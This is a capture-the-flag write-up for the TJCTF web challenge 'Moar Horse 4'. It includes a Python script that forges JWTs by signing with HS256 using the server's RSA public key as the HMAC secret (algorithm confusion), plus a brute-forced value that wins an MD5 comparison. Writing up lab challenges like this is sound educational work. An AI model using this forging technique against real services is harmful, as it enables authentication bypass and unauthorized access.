# Moar-Horse-4
Web, 80

>  Written by nthistle
>  It seems like the TJCTF organizers are secretly running an underground virtual horse racing platform! They call it 'Moar Horse 4'... See if you can get a flag from it!
>  Source
  
Not a bad challenge, but Cookie Cutter ([ACTF 2019](https://files.actf.co/be68de25b4dcd9cecd2d16fc2eb974bf3892604d9ecdeb10b7c2c21346117a54/cookie_cutter.js)) was better.

This challenge is about JWTs. We need to forge a JWT token that allows us to have a winning horse. However, the JWT tokens are verified with the public key, which is provided in the source. There is a very suspicious line in the source that disables checking for public keys in HMAC secrets, confirming that this is the way to go. We create a JWT token which is signed using the HS256 algorithm, where the secret is the public key.

Now we need to create a winning horse. The horse racing code is below:
```python
boss_speed = int(hashlib.md5(("Horse_" + BOSS_HORSE).encode()).hexdigest(), 16)
your_speed = int(hashlib.md5(("Horse_" + race_horse).encode()).hexdigest(), 16)
if your_speed > boss_speed:
    return render_template("race_results.html", money=data["money"], victory=True, flag=flag)
```
With a bit of bruteforcing, we can construct a winning horse named `b1c_3133707226937`. The speed of this horse is `0xffffffcfb525620abb304a58d7ac5410`. Quite fast indeed. We create our cookie using the script below.
```python
import jwt
jwt.algorithms.HMACAlgorithm.prepare_key = lambda self, key : jwt.utils.force_bytes(key)
with open("pubkey.pem") as f:
  p = f.read()
data = {
  "user":True,
  "is_omkar":True,
  "money":999999,
  "horses":['b1c_3133707226937'],
}
print(jwt.encode(data, p, "HS256"))
```
After racing our horse against the boss, we get the flag: `tjctf{w0www_y0ur_h0rs3_is_f444ST!}`